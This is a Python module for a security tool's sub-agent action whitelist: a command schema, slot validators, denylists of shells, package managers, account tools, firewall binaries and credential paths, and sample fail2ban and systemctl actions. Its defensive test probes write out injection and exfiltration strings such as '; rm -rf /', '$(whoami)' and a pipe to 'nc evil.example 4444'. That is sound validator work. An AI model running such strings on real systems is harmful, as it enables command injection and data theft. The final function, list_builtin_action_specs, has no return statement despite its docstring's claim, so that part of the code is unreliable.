"""
Sub-agent action whitelist -- the ActionSpec schema, slot validators, and §5
hard exclusions (control 3/3a; docs/subagent_architecture.md,
docs/subagent_whitelist_design.md). This is the actual security boundary for
capability 2 (direct execution) -- "the whitelist -- not command signing --
is the security boundary" (architecture doc, corrected threat model).

**Status (2026-09-22): the design doc's §9 open decisions were RATIFIED by
the owner** (adopting the Appendix A recommendations), which unblocks
BUILDING capability 2 against a decided spec. The one thing not waived is the
independent security review -- it is RE-PLACED to gate ENABLING execution
against a real target (reviewing the actual built code before it's ever
turned on against a live machine), not building it. Nothing in this
repository enables execution against a real target; that switch does not
exist. See `docs/subagent_whitelist_design.md` §9/Appendix A for the full
rationale behind every decision encoded below.

This module itself has no storage/persistence, no signing, no dispatch, and
no TUI -- those live in `kratos.storage.whitelist_store` (CRUD + per-target
scoping), the (forthcoming) signed dispatch protocol, and
`kratos.tui_mk2.screens.whitelist` respectively. What lives here is pure: the
schema, the four closed slot-validator types, the hard exclusions, computed
sensitivity tiering, and argv assembly. `ActionSpec`/`Slot` are frozen
dataclasses; every function is side-effect-free.

**Trust model (2026-09-28, review findings F1/F2)**: the checks in this module
are a DENYLIST and are no longer the execution boundary on their own. The
boundary is `kratos.subagent.ceiling` -- an allowlist of exact binaries and
argument shapes shipped as code inside the agent itself, which every pushed
action and every concrete argv must match before anything runs. This module
stays as the schema, the slot validators, and an early, friendlier reject for
obviously-bad definitions.

The one principle everything here enforces (design doc §2): an action is a
fixed command template with typed, validated parameter *slots* -- never a
command string, never free text, never a shell. `render_argv` assembles an
argv LIST (never a shell string) from a spec's fixed template plus validated
slot values; nothing here ever concatenates a string into a command.
"""
from __future__ import annotations

import ipaddress
import re
from collections.abc import Sequence
from dataclasses import dataclass, field
from typing import Any, Literal

SlotKind = Literal["enum", "ip", "int_range", "token"]
_VALID_SLOT_KINDS = ("enum", "ip", "int_range", "token")

Layer = Literal["maintainer", "user"]
_VALID_LAYERS = ("maintainer", "user")

Sensitivity = Literal["low", "medium", "high"]


class ActionSpecError(ValueError):
    """An ActionSpec (or a Slot inside it) is not structurally valid -- a
    definition-time failure, never raised by a bad runtime slot VALUE (see
    SlotValueError for that)."""


class HardExclusionError(ActionSpecError):
    """The spec touches one of design doc §5's hard-excluded categories
    (shell/interpreter, credential/secret path, package install, account
    change, service.stop/sshd-disruption, or -- per §9 #6 -- a
    firewall/reachability binary). Always a hard reject, never a warning."""


class SlotValueError(ValueError):
    """A concrete value supplied for a slot at render time fails that slot's
    validator. Distinct from ActionSpecError: this is about one dispatch
    attempt, not the definition itself."""


# ---------------------------------------------------------------------------
# Slot definitions
# ---------------------------------------------------------------------------

# Adversarial probes a token slot's pattern must NEVER match, regardless of
# whether the default pattern or a spec-supplied custom one is in use --
# checked at slot-DEFINITION time (validate_spec), not just against values
# seen at render time, so a too-permissive custom pattern is caught before it
# is ever used to accept a real value.
_TOKEN_ADVERSARIAL_PROBES: tuple[str, ...] = (
    "; rm -rf /",
    "$(whoami)",
    "`whoami`",
    "../../etc/passwd",
    "/etc/shadow",
    "a && reboot",
    "a || reboot",
    "a | nc evil.example 4444",
    "a\nreboot",
    "a\x00b",
    "a b",
    "-la",
    "--help",
    "a/b",
    "a.b",
)

_DEFAULT_TOKEN_PATTERN = r"^[a-z0-9_][a-z0-9_-]*$"  # no leading '-' -- see _TOKEN_ADVERSARIAL_PROBES ("-la")
_DEFAULT_TOKEN_MAX_LENGTH = 64


@dataclass(frozen=True)
class Slot:
    """One typed, validated parameter slot (design doc §4). `kind` is one of
    the four closed validator types -- there is deliberately no 'path' or
    'freetext'/'string' kind anywhere in this type: a slot that needs a path
    is only ever an `enum` of specific literal allowlisted paths (and even
    then, `validate_spec`'s sensitive-path scan still applies to those
    literal values)."""

    kind: SlotKind
    # enum
    values: tuple[str, ...] | None = None
    # ip
    ip_deny_private: bool = False
    # int_range
    min_value: int | None = None
    max_value: int | None = None
    # token
    pattern: str = _DEFAULT_TOKEN_PATTERN
    max_length: int = _DEFAULT_TOKEN_MAX_LENGTH


@dataclass(frozen=True)
class ActionSpec:
    """One whitelisted action (design doc §3). `effect`/`reversibility`/
    `blast_radius` are part of the definition, authored by a human, and are
    control 7's source of truth for an approval screen -- never LLM-generated
    text.

    `reversible`/`disrupts_running_service`/`reachability_adjacent` are
    declared structural properties (design doc §9 #2/Appendix A #3) that
    `compute_sensitivity_tier()` derives the tier from -- sensitivity is
    deliberately NOT a field a spec author can just assert; see that function.
    `reachability_adjacent` is partially machine-checked: `validate_spec`
    rejects a spec that touches a firewall-related enum value while declaring
    `reachability_adjacent=False` (it may still be over-declared True for an
    action that doesn't strictly need it -- that direction is always safe).

    `inverse_id`, if set, must name another action in the same set whose own
    `inverse_id` points back (a symmetric reversibility pair, design doc §9
    #1) -- checked by `validate_action_set`, not per-spec (a lone spec can't
    see its sibling).

    `source_recommendation` names the findings-engine check(s)/finding
    id(s)/rule(s) this action is the executable image of (design doc §9 #1) --
    required for every `layer="maintainer"` spec UNLESS it is the declared
    inverse of one that has it (an inverse exists to make its sibling safely
    reversible, not because it is itself independently recommended).
    """

    id: str
    layer: Layer
    argv_template: tuple[str, ...]
    slots: dict[str, Slot] = field(default_factory=dict)
    effect: str = ""
    reversibility: str = ""
    blast_radius: str = ""
    reversible: bool = False
    disrupts_running_service: bool = False
    reachability_adjacent: bool = False
    inverse_id: str | None = None
    source_recommendation: tuple[str, ...] = ()
    requires_typed_execute: bool = True


_PLACEHOLDER_RE = re.compile(r"^\{([a-zA-Z_][a-zA-Z0-9_]*)\}$")

# Shell/interpreter binaries -- an entry naming one of these anywhere in its
# fixed argv is a re-parsed-string command, exactly the pattern design doc §2
# forbids ("never a command string, never free text, never a shell").
_BANNED_SHELL_INTERPRETERS = frozenset({
    "sh", "bash", "zsh", "dash", "ksh", "csh", "tcsh", "fish",
    "python", "python2", "python3", "perl", "ruby", "node", "php", "lua",
    "eval", "exec", "env", "xargs", "find", "awk",
})

# Arbitrary package installation -- excluded per §5 ("no apt/dnf/pip install
# {name} with a slot"). A fixed, specific package as a reviewed maintainer
# default is a separate, not-yet-made call (open decision, not resolved by
# this module banning the binary outright).
_BANNED_PACKAGE_MANAGERS = frozenset({
    "apt", "apt-get", "aptitude", "dnf", "yum", "zypper",
    "pip", "pip3", "snap", "npm", "gem", "dpkg", "rpm", "brew",
})

# User/privilege/account changes -- excluded from the default set per §5.
_BANNED_ACCOUNT_BINARIES = frozenset({
    "useradd", "userdel", "usermod", "adduser", "deluser",
    "passwd", "chpasswd", "groupadd", "groupdel", "groupmod",
    "gpasswd", "visudo", "su", "sudo",
})

# Reachability-affecting binaries invoked DIRECTLY -- design doc §9 #6:
# default-deny, `ufw.allow_from` rejected, no firewall action ships in the
# initial set. Distinct from *toggling* a firewall unit through systemctl
# (service.enable_now/disable_now with unit="ufw") -- that's a coarser,
# already-vetted on/off action decision #1's illustrative set allows; THIS
# ban is about invoking a firewall CLI's own rule-editing surface
# (allow/deny/insert/delete-shaped commands) directly, which stays banned
# even after the decisions were ratified (no firewall-rule action was
# approved -- only the possibility of a future one, itself gated, per §9 #6).
_BANNED_REACHABILITY_BINARIES = frozenset({
    "ufw", "iptables", "ip6tables", "nft", "firewalld", "firewall-cmd",
})

# systemd units that, if reachable through a DISRUPTIVE systemctl verb
# (restart/disable/stop/mask/kill), are firewall-adjacent -- toggling one of
# these off (even transiently, e.g. mid-restart) can affect reachability.
# Used by validate_spec to require `reachability_adjacent=True` be truthfully
# declared on any spec whose enum touches one of these (§9 #2/#6).
_FIREWALL_RELATED_ENUM_VALUES = frozenset({"ufw", "iptables", "ip6tables", "nft", "nftables", "firewalld"})

# design doc §9 #1's hard carve-outs: no `service.stop`-shaped action at all,
# and sshd/ssh must never be reachable through a verb that could disrupt it
# (never sever your own access).
_BANNED_SYSTEMCTL_VERBS = frozenset({"stop", "mask", "kill"})
_SSHD_EXCLUDED_SYSTEMCTL_VERBS = frozenset({"restart", "disable", "stop", "mask", "kill"})

# Credential/secret-adjacent material -- unreachable, full stop (§5), checked
# against every LITERAL argv token and every enum slot VALUE, case-
# insensitively, regardless of which slot or position it appears in.
_SENSITIVE_PATH_MARKERS: tuple[str, ...] = (
    "authorized_keys",
    "/etc/shadow",
    "/etc/sudoers",
    "sudoers.d",
    ".ssh/",
    "/etc/cron",
    "cron.d",
    "crontab",
    "/etc/systemd/",
    "/lib/systemd/",
    "/usr/lib/systemd/",
    "id_rsa",
    "id_ed25519",
    "id_ecdsa",
    ".pem",
    ".p12",
    ".pfx",
)


def _basename(token: str) -> str:
    return token.rsplit("/", 1)[-1]


def touches_firewall_related_unit(slots: dict[str, Slot]) -> bool:
    """True if any enum slot in `slots` allows a firewall-related unit name
    (design doc §9 #2/#6). Exposed (not private) so the templating/CRUD layer
    can recompute `reachability_adjacent` for a user-scoped EFFECTIVE spec
    built from a narrowed subset of a template's enum values, rather than
    blindly inheriting the template's own (necessarily conservative, since a
    template's enum spans everything it COULD allow) declaration."""
    return any(
        slot.kind == "enum" and any(v.lower() in _FIREWALL_RELATED_ENUM_VALUES for v in (slot.values or ()))
        for slot in slots.values()
    )


def _validate_slot_definition(name: str, slot: Slot) -> None:
    if slot.kind not in _VALID_SLOT_KINDS:
        raise ActionSpecError(f"slot {name!r}: unknown kind {slot.kind!r} (must be one of {_VALID_SLOT_KINDS})")

    if slot.kind == "enum":
        if not slot.values or not isinstance(slot.values, tuple):
            raise ActionSpecError(f"slot {name!r}: an 'enum' slot needs a non-empty tuple of values")
        if any(not isinstance(v, str) or not v for v in slot.values):
            raise ActionSpecError(f"slot {name!r}: enum values must be non-empty strings")
        if len(set(slot.values)) != len(slot.values):
            raise ActionSpecError(f"slot {name!r}: enum values must be unique")
    elif slot.kind == "ip":
        pass  # no required fields beyond the frozen defaults
    elif slot.kind == "int_range":
        if slot.min_value is None or slot.max_value is None:
            raise ActionSpecError(f"slot {name!r}: an 'int_range' slot needs both min_value and max_value")
        if not isinstance(slot.min_value, int) or not isinstance(slot.max_value, int):
            raise ActionSpecError(f"slot {name!r}: min_value/max_value must be ints")
        if slot.min_value > slot.max_value:
            raise ActionSpecError(f"slot {name!r}: min_value must be <= max_value")
    elif slot.kind == "token":
        if slot.max_length <= 0:
            raise ActionSpecError(f"slot {name!r}: max_length must be positive")
        try:
            compiled = re.compile(slot.pattern)
        except re.error as e:
            raise ActionSpecError(f"slot {name!r}: pattern does not compile: {e}") from e
        for probe in _TOKEN_ADVERSARIAL_PROBES:
            if compiled.fullmatch(probe):
                raise ActionSpecError(
                    f"slot {name!r}: pattern {slot.pattern!r} matches the adversarial probe {probe!r} -- "
                    "too permissive for a token slot (no free-text/shell-shaped values allowed)"
                )


def _validate_slot_value(action_id: str, name: str, slot: Slot, value: object) -> None:
    if slot.kind == "enum":
        if not isinstance(value, str) or value not in (slot.values or ()):
            raise SlotValueError(f"{action_id}: slot {name!r} must be one of {slot.values}, got {value!r}")
    elif slot.kind == "ip":
        if not isinstance(value, str):
            raise SlotValueError(f"{action_id}: slot {name!r} must be a string IP address, got {value!r}")
        try:
            addr = ipaddress.ip_address(value)
        except ValueError as e:
            raise SlotValueError(f"{action_id}: slot {name!r} is not a valid IP address: {value!r}") from e
        if slot.ip_deny_private and (addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_reserved or addr.is_multicast):
            raise SlotValueError(f"{action_id}: slot {name!r} rejects private/loopback/reserved addresses, got {value!r}")
    elif slot.kind == "int_range":
        if isinstance(value, bool) or not isinstance(value, int):
            raise SlotValueError(f"{action_id}: slot {name!r} must be an int, got {value!r}")
        if not (slot.min_value <= value <= slot.max_value):
            raise SlotValueError(f"{action_id}: slot {name!r} must be in [{slot.min_value}, {slot.max_value}], got {value!r}")
    elif slot.kind == "token":
        if not isinstance(value, str) or len(value) > slot.max_length or not re.fullmatch(slot.pattern, value):
            raise SlotValueError(f"{action_id}: slot {name!r} failed its token pattern/length check, got {value!r}")
    else:  # pragma: no cover -- validate_spec() already rejects unknown kinds before this can run
        raise SlotValueError(f"{action_id}: slot {name!r} has an unrecognized kind {slot.kind!r}")


def validate_slot_value(action_id: str, name: str, slot: Slot, value: object) -> None:
    """Public form of the per-slot value validator (raises SlotValueError).
    Shared with `ceiling`, which applies the same closed validators to the
    concrete argv the agent is about to run."""
    _validate_slot_value(action_id, name, slot, value)


def _check_hard_exclusions(spec: ActionSpec, literal_tokens: list[str]) -> None:
    # Enum VALUES land in the argv exactly like literals do, so they get the
    # same binary checks (review finding F3: `busybox {applet}` with an enum
    # of {"sh"} used to smuggle a shell past a literal-only scan).
    enum_values = [v for slot in spec.slots.values() if slot.kind == "enum" for v in (slot.values or ())]
    for tok in (*literal_tokens, *enum_values):
        base = _basename(tok).lower()
        if base in _BANNED_SHELL_INTERPRETERS:
            raise HardExclusionError(
                f"{spec.id}: {tok!r} is a shell/interpreter binary -- an action must be a fixed command, "
                "never one that re-parses a string (design doc §2/§5)"
            )
        if base in _BANNED_PACKAGE_MANAGERS:
            raise HardExclusionError(
                f"{spec.id}: {tok!r} is a package manager -- arbitrary package installation is excluded "
                "(design doc §5; a specific reviewed package is a separate, not-yet-made open decision)"
            )
        if base in _BANNED_ACCOUNT_BINARIES:
            raise HardExclusionError(
                f"{spec.id}: {tok!r} changes user/privilege/account state -- excluded from the default set "
                "(design doc §5)"
            )
        # Firewall names are legitimate enum VALUES (a systemd unit called
        # "ufw"); only invoking the firewall CLI itself is banned here.
        if base in _BANNED_REACHABILITY_BINARIES and tok in literal_tokens:
            raise HardExclusionError(
                f"{spec.id}: {tok!r} can affect network/firewall reachability directly -- excluded per "
                "design doc §9 #6 (default-deny; no firewall-rule action shipped)"
            )

    if literal_tokens and len(literal_tokens) > 1 and _basename(literal_tokens[0]).lower() == "systemctl":
        verb = literal_tokens[1].lower()
        if verb in _BANNED_SYSTEMCTL_VERBS:
            raise HardExclusionError(
                f"{spec.id}: 'systemctl {verb}' is excluded -- no action may stop/mask/kill a service "
                "outright (design doc §9 #1: no service.stop)"
            )
        if verb in _SSHD_EXCLUDED_SYSTEMCTL_VERBS:
            for slot in spec.slots.values():
                if slot.kind == "enum" and any(v.lower() in ("ssh", "sshd") for v in (slot.values or ())):
                    raise HardExclusionError(
                        f"{spec.id}: sshd/ssh must never be reachable via a disruptive systemctl verb "
                        f"({verb!r}) -- never sever your own access (design doc §9 #1)"
                    )

    haystack_parts = [t.lower() for t in literal_tokens]
    for slot in spec.slots.values():
        if slot.kind == "enum":
            haystack_parts.extend(v.lower() for v in (slot.values or ()))
    haystack = " ".join(haystack_parts)
    for marker in _SENSITIVE_PATH_MARKERS:
        if marker in haystack:
            raise HardExclusionError(
                f"{spec.id}: touches credential/secret-adjacent material ({marker!r}) -- unreachable, "
                "full stop (design doc §5)"
            )


def _check_reachability_declaration(spec: ActionSpec) -> None:
    if touches_firewall_related_unit(spec.slots) and not spec.reachability_adjacent:
        raise ActionSpecError(
            f"{spec.id}: an enum slot allows a firewall-related unit but reachability_adjacent=False -- "
            "must be truthfully declared True so the computed sensitivity tier reflects the real risk "
            "(design doc §9 #2/#6); over-declaring True when it doesn't strictly apply is fine, "
            "under-declaring is not"
        )


def validate_spec(spec: ActionSpec, *, hard_exclusions: bool = True) -> None:
    """Structural validation of an ActionSpec definition -- the definition-
    time half of the whitelist boundary. Raises ActionSpecError (or its
    HardExclusionError subclass for a §5 category) on any violation; returns
    None on success. Deliberately re-run by `render_argv` before every
    dispatch attempt (design doc §4's "validation runs twice, independently"
    -- here that means "never trust a spec object just because it was valid
    once," the same defense-in-depth spirit; the actual core+agent
    independent re-validation is the execution channel's job, not this
    function's).

    Does NOT check `source_recommendation` coverage or `inverse_id`
    symmetry -- those are properties of a whole SET of specs (a lone spec
    can't see its siblings); see `validate_action_set`.

    `hard_exclusions=False` skips only the §5 denylist, for an entry that
    matches an exact command the TARGET's own admin allowlisted on the target
    (`ceiling.load_local_commands`) -- that explicit local choice outranks the
    maintainer denylist. Only `ceiling.check_spec` passes False, and only
    after it has confirmed the match."""
    if not spec.id or not re.fullmatch(r"[a-z][a-z0-9_.]*", spec.id):
        raise ActionSpecError(f"invalid action id {spec.id!r} -- must be a lowercase dotted identifier")
    if spec.layer not in _VALID_LAYERS:
        raise ActionSpecError(f"{spec.id}: layer must be one of {_VALID_LAYERS}, got {spec.layer!r}")
    if not spec.requires_typed_execute:
        raise ActionSpecError(
            f"{spec.id}: requires_typed_execute must always be True -- the typed-EXECUTE gate (control 7) "
            "is required in both recommend-only and direct-execution modes and is never shortened per-action"
        )
    if not spec.argv_template or not isinstance(spec.argv_template, tuple):
        raise ActionSpecError(f"{spec.id}: argv_template must be a non-empty tuple of strings, never a string")
    if any(not isinstance(t, str) for t in spec.argv_template) or not spec.argv_template[0]:
        # An empty ARGUMENT is legitimate (e.g. `adduser --gecos '' alice`; argv
        # has no shell to mangle it) -- only the program itself must be named.
        raise ActionSpecError(f"{spec.id}: argv_template must be strings, and the program (first token) non-empty")
    if _PLACEHOLDER_RE.fullmatch(spec.argv_template[0]):
        raise ActionSpecError(
            f"{spec.id}: argv_template[0] (the binary) must be a fixed literal -- an action whose command "
            "itself is a slot is exactly the 'blank the model fills in' hole design doc §5/3a forbids"
        )

    referenced: set[str] = set()
    literal_tokens: list[str] = []
    for tok in spec.argv_template:
        m = _PLACEHOLDER_RE.fullmatch(tok)
        if m:
            referenced.add(m.group(1))
        else:
            if "{" in tok or "}" in tok:
                raise ActionSpecError(
                    f"{spec.id}: token {tok!r} mixes literal text with a slot placeholder -- each token must "
                    "be either fully literal or exactly one whole '{slot}' placeholder"
                )
            literal_tokens.append(tok)

    declared = set(spec.slots)
    if referenced != declared:
        raise ActionSpecError(
            f"{spec.id}: slot/placeholder mismatch -- declared slots {sorted(declared)}, "
            f"referenced in argv_template {sorted(referenced)}"
        )
    for name, slot in spec.slots.items():
        _validate_slot_definition(name, slot)

    if not spec.effect.strip() or not spec.reversibility.strip() or not spec.blast_radius.strip():
        raise ActionSpecError(
            f"{spec.id}: effect/reversibility/blast_radius must all be non-empty, human-authored text "
            "(control 7's source of truth for an approval screen)"
        )

    if hard_exclusions:
        _check_hard_exclusions(spec, literal_tokens)
    _check_reachability_declaration(spec)


def validate_action_set(specs: Sequence[ActionSpec]) -> None:
    """Validation that only makes sense across a WHOLE set of specs together
    (design doc §9 #1/#7's "re-review triggered on any change" -- this is the
    machine-checkable structural half of that): every spec individually
    valid, ids unique, every `inverse_id` resolves and is symmetric (design
    doc §9 #1's reversibility-pair rule), and every `layer="maintainer"` spec
    is tied to a real recommendation, directly or via being the declared
    inverse of one that is."""
    for spec in specs:
        validate_spec(spec)

    by_id: dict[str, ActionSpec] = {}
    for spec in specs:
        if spec.id in by_id:
            raise ActionSpecError(f"duplicate action id {spec.id!r}")
        by_id[spec.id] = spec

    for spec in specs:
        if spec.inverse_id is None:
            continue
        inverse = by_id.get(spec.inverse_id)
        if inverse is None:
            raise ActionSpecError(f"{spec.id}: inverse_id {spec.inverse_id!r} is not a known action in this set")
        if inverse.inverse_id != spec.id:
            raise ActionSpecError(
                f"{spec.id} <-> {spec.inverse_id}: a reversibility pair must be symmetric (design doc §9 #1)"
            )

    for spec in specs:
        if spec.layer != "maintainer":
            continue
        covered = bool(spec.source_recommendation) or (
            spec.inverse_id is not None and bool(by_id[spec.inverse_id].source_recommendation)
        )
        if not covered:
            raise ActionSpecError(
                f"{spec.id}: a maintainer default must be tied to a real findings-engine recommendation "
                "(source_recommendation), or be the declared inverse of one that is (design doc §9 #1)"
            )


def compute_sensitivity_tier(spec: ActionSpec) -> Sensitivity:
    """Design doc §9 #2/Appendix A #3: the tier is DERIVED from declared spec
    properties, never hand-assigned. `reachability_adjacent` alone is enough
    for `high` (could affect Kratos's own access -- the single worst outcome
    this mechanism defends against); otherwise `disrupts_running_service` and
    `not reversible` each contribute one point, and two-or-more points is
    `high`, exactly one is `medium`, none is `low`. Friction escalates by
    tier (low: typed EXECUTE; medium: + a reversibility warning; high: + a
    second confirm + a louder system warning + disabled-by-default, see
    `default_enabled_for_tier`)."""
    if spec.reachability_adjacent:
        return "high"
    score = int(spec.disrupts_running_service) + int(not spec.reversible)
    if score >= 2:
        return "high"
    if score == 1:
        return "medium"
    return "low"


def default_enabled_for_tier(tier: Sensitivity) -> bool:
    """Design doc §9 #2: low/medium maintainer defaults are enabled for a
    target once that target has opted into execution at all (opt-out model);
    `high`-tier actions stay disabled even then, requiring an explicit
    additional per-action opt-in on top of the per-target execution toggle."""
    return tier != "high"


def render_argv(spec: ActionSpec, slot_values: dict[str, object], *, hard_exclusions: bool = True) -> list[str]:
    """Assemble the concrete argv LIST for one dispatch of `spec` with
    `slot_values` -- never a shell string, never string concatenation.
    Re-validates the spec itself first, then every supplied value against its
    slot's validator; any failure is a hard reject (SlotValueError or
    ActionSpecError), never a clamp-and-continue. This function has no
    knowledge of signing or transport -- it only ever returns a list of
    strings; the execution channel decides what to do with it."""
    validate_spec(spec, hard_exclusions=hard_exclusions)
    provided = set(slot_values)
    declared = set(spec.slots)
    if provided != declared:
        raise SlotValueError(f"{spec.id}: expected exactly the slots {sorted(declared)}, got {sorted(provided)}")
    for name, slot in spec.slots.items():
        _validate_slot_value(spec.id, name, slot, slot_values[name])

    argv: list[str] = []
    for tok in spec.argv_template:
        m = _PLACEHOLDER_RE.fullmatch(tok)
        argv.append(str(slot_values[m.group(1)]) if m else tok)
    return argv


# ---------------------------------------------------------------------------
# Illustrative starter set (design doc §8, refined per §9 #1) -- still
# illustrative (a real, final set needs the full findings-engine sweep + the
# independent review before it ever ships/enables), but each entry here is
# now genuinely tied to a real, existing recommendation rather than invented:
#   - fail2ban.ban_ip/unban_ip: the executable image of CORR-SSH-001/CORR-001
#     ("SSH exposure correlated with failed-login burst... consider
#     rate-limiting / lockout controls (e.g., fail2ban)",
#     adapters/findings_engine.py) plus AUTH-004's IP-attributed bursts.
#   - service.enable_now/disable_now: the executable image of
#     run_config_audit's real `fail2ban_status`/`firewall` FAIL checks
#     ("fail2ban is installed but the service is not active" /
#     "ufw installed but not active", adapters/ssh_remote.py's config-audit
#     script) -- i.e. exactly the fail2ban-inactive scenario that originally
#     surfaced the observe-and-recommend boundary this whole mechanism sits
#     under (docs/DESIGN.md, "Execution boundary").
# `service.restart` from the original §8 draft is DROPPED here: no real
# recommendation currently says "restart fail2ban/ufw" specifically, and
# decision #1 is explicit that a default action must be tied to one.
# `ufw.allow_from` remains absent per §9 #6 (see the fuzz/unit tests proving
# it's rejected, not merely omitted).
# ---------------------------------------------------------------------------
_DRAFT_BUILTIN_SPECS: tuple[ActionSpec, ...] = (
    ActionSpec(
        id="fail2ban.ban_ip",
        layer="maintainer",
        argv_template=("fail2ban-client", "set", "{jail}", "banip", "{ip}"),
        slots={"jail": Slot(kind="enum", values=("sshd",)), "ip": Slot(kind="ip", ip_deny_private=True)},
        effect="Bans one IP address in one fail2ban jail.",
        reversibility="Reversible -- unban with fail2ban.unban_ip.",
        blast_radius="Single IP; no service restart; no data change.",
        reversible=True,
        disrupts_running_service=False,
        reachability_adjacent=False,
        inverse_id="fail2ban.unban_ip",
        source_recommendation=("CORR-SSH-001", "CORR-001", "AUTH-004"),
    ),
    ActionSpec(
        id="fail2ban.unban_ip",
        layer="maintainer",
        argv_template=("fail2ban-client", "set", "{jail}", "unbanip", "{ip}"),
        slots={"jail": Slot(kind="enum", values=("sshd",)), "ip": Slot(kind="ip", ip_deny_private=True)},
        effect="Unbans one IP address in one fail2ban jail.",
        reversibility="Reversible -- re-ban with fail2ban.ban_ip.",
        blast_radius="Single IP; no service restart; no data change.",
        reversible=True,
        disrupts_running_service=False,
        reachability_adjacent=False,
        inverse_id="fail2ban.ban_ip",
        # No independent recommendation of its own -- exists to make
        # fail2ban.ban_ip's mistakes reversible (design doc §9 #1); covered
        # via that inverse relationship, not an empty claim to be recommended.
    ),
    ActionSpec(
        id="service.enable_now",
        layer="maintainer",
        argv_template=("systemctl", "enable", "--now", "{unit}"),
        slots={"unit": Slot(kind="enum", values=("fail2ban", "ufw"))},
        effect="Enables and starts one unit from a fixed allowlist.",
        reversibility="Reversible -- service.disable_now on the same unit.",
        blast_radius="One service on the target host.",
        reversible=True,
        disrupts_running_service=False,
        reachability_adjacent=True,  # unit enum includes "ufw" -- see touches_firewall_related_unit
        inverse_id="service.disable_now",
        source_recommendation=("run_config_audit:fail2ban_status:FAIL", "run_config_audit:firewall:FAIL"),
    ),
    ActionSpec(
        id="service.disable_now",
        layer="maintainer",
        argv_template=("systemctl", "disable", "--now", "{unit}"),
        slots={"unit": Slot(kind="enum", values=("fail2ban", "ufw"))},
        effect="Stops and disables one unit from a fixed allowlist.",
        reversibility="Reversible -- service.enable_now on the same unit.",
        blast_radius="One service on the target host.",
        reversible=True,
        disrupts_running_service=True,  # stops a currently-running unit
        reachability_adjacent=True,  # unit enum includes "ufw"
        inverse_id="service.enable_now",
        # Covered via the inverse relationship to service.enable_now, same
        # reasoning as fail2ban.unban_ip above.
    ),
)


def spec_to_wire(spec: ActionSpec) -> dict:
    """Serialize an ActionSpec to a plain JSON-able dict, for the (signed)
    whitelist-push message the execution channel sends core -> agent.
    Round-trips exactly through `spec_from_wire`. Does not validate --
    callers validate before signing/sending and again after receiving/
    deserializing (design doc §4's "twice, independently")."""
    return {
        "id": spec.id,
        "layer": spec.layer,
        "argv_template": list(spec.argv_template),
        "slots": {
            name: {
                "kind": slot.kind,
                "values": list(slot.values) if slot.values is not None else None,
                "ip_deny_private": slot.ip_deny_private,
                "min_value": slot.min_value,
                "max_value": slot.max_value,
                "pattern": slot.pattern,
                "max_length": slot.max_length,
            }
            for name, slot in spec.slots.items()
        },
        "effect": spec.effect,
        "reversibility": spec.reversibility,
        "blast_radius": spec.blast_radius,
        "reversible": spec.reversible,
        "disrupts_running_service": spec.disrupts_running_service,
        "reachability_adjacent": spec.reachability_adjacent,
        "inverse_id": spec.inverse_id,
        "source_recommendation": list(spec.source_recommendation),
        "requires_typed_execute": spec.requires_typed_execute,
    }


_MISSING = object()


def _wire_field(obj: dict, key: str, kinds: tuple[type, ...], where: str, default: Any = _MISSING,
                *, nullable: bool = False) -> Any:
    """One field of a wire dict, with its exact JSON type. bool is never
    accepted as an int (JSON true is not 1 here), and nothing is coerced:
    a string where a list belongs is refused, not split into characters."""
    if key not in obj:
        if default is _MISSING:
            raise ActionSpecError(f"malformed ActionSpec wire payload: {where} is missing {key!r}")
        return default
    value = obj[key]
    if value is None and nullable:
        return None
    if isinstance(value, bool) and bool not in kinds:
        ok = False
    else:
        ok = isinstance(value, kinds)
    if not ok:
        names = "/".join(k.__name__ for k in kinds) + (" or null" if nullable else "")
        raise ActionSpecError(f"malformed ActionSpec wire payload: {where}.{key} must be {names}, "
                              f"not {type(value).__name__}")
    return value


def _wire_str_list(obj: dict, key: str, where: str, default: Any = _MISSING, *, nullable: bool = False) -> Any:
    items = _wire_field(obj, key, (list,), where, default, nullable=nullable)
    if items is None or items is default:
        return items
    if not all(isinstance(i, str) for i in items):
        raise ActionSpecError(f"malformed ActionSpec wire payload: {where}.{key} must be a list of strings")
    return tuple(items)


def _slot_from_wire(name: Any, raw: Any) -> Slot:
    if not isinstance(name, str):
        raise ActionSpecError("malformed ActionSpec wire payload: a slot name is not a string")
    where = f"slots[{name!r}]"
    if not isinstance(raw, dict):
        raise ActionSpecError(f"malformed ActionSpec wire payload: {where} must be an object")
    return Slot(
        kind=_wire_field(raw, "kind", (str,), where),
        values=_wire_str_list(raw, "values", where, None, nullable=True),
        ip_deny_private=_wire_field(raw, "ip_deny_private", (bool,), where, False),
        min_value=_wire_field(raw, "min_value", (int,), where, None, nullable=True),
        max_value=_wire_field(raw, "max_value", (int,), where, None, nullable=True),
        pattern=_wire_field(raw, "pattern", (str,), where, _DEFAULT_TOKEN_PATTERN),
        max_length=_wire_field(raw, "max_length", (int,), where, _DEFAULT_TOKEN_MAX_LENGTH),
    )


def spec_from_wire(data: Any) -> ActionSpec:
    """Inverse of `spec_to_wire`. Every field is checked for its exact JSON
    type; anything structurally wrong raises ActionSpecError -- the same
    family `validate_spec` raises -- never a stray KeyError/TypeError/
    AttributeError (review v2 F-4: `"slots": null` escaped as AttributeError
    and dropped the whole push without an answer), and nothing is coerced
    (F-11: a string `values` used to become a tuple of its characters).
    Unknown keys are ignored, so an older agent still reads a newer core's
    push. Callers still run `validate_spec` on the result."""
    if not isinstance(data, dict):
        raise ActionSpecError("malformed ActionSpec wire payload: not an object")
    where = "action"
    raw_slots = _wire_field(data, "slots", (dict,), where, {})
    return ActionSpec(
        id=_wire_field(data, "id", (str,), where),
        layer=_wire_field(data, "layer", (str,), where),
        argv_template=_wire_str_list(data, "argv_template", where),
        slots={name: _slot_from_wire(name, raw) for name, raw in raw_slots.items()},
        effect=_wire_field(data, "effect", (str,), where, ""),
        reversibility=_wire_field(data, "reversibility", (str,), where, ""),
        blast_radius=_wire_field(data, "blast_radius", (str,), where, ""),
        reversible=_wire_field(data, "reversible", (bool,), where, False),
        disrupts_running_service=_wire_field(data, "disrupts_running_service", (bool,), where, False),
        reachability_adjacent=_wire_field(data, "reachability_adjacent", (bool,), where, False),
        inverse_id=_wire_field(data, "inverse_id", (str,), where, None, nullable=True),
        source_recommendation=_wire_str_list(data, "source_recommendation", where, ()),
        requires_typed_execute=_wire_field(data, "requires_typed_execute", (bool,), where, True),
    )


def list_builtin_action_specs() -> tuple[ActionSpec, ...]:
    """The illustrative maintainer starter set (design doc §8, refined per
    §9 #1 -- see the block comment above). Passes `validate_action_set`. Not
    yet reachable from the agent or any dispatch path in this repository --
    the storage/CRUD layer (`kratos.storage.whitelist_store`) is what
    actually loads a real per-target action set, of which this is the
    current maintainer half."""
